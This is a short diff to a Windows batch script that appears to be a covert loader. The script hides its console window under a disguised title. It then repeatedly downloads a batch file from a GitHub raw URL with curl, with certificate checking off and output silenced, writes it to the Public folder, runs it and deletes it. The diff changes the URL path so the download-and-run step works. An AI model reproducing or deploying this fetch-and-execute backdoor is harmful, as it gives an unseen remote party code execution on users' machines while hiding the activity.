@@ -4,7 +4,7 @@ set "mus=%PUBLIC%\zztb"
 sysc.exe win hide title "system18643"
 set "ver=1.0"
 set req=auxstart
-curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/blob/main/sys.suzar" --output "%mus%\rq.bat"
+curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/refs/heads/main/sys.suzar" --output "%mus%\rq.bat"
 call "%mus%\rq.bat"
 %out%
 del "%mus%\rq.bat"
@@ -17,7 +17,7 @@ if not "%a%" == "X" (
       ) else (
         sysc.exe setsysvolume %out%
         set req=auxstart
-        curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/blob/main/sys.suzar" --output "%mus%\rq.bat"
+        curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/refs/heads/main/sys.suzar" --output "%mus%\rq.bat"
         call "%mus%\rq.bat"
         %out%
         del "%mus%\rq.bat"
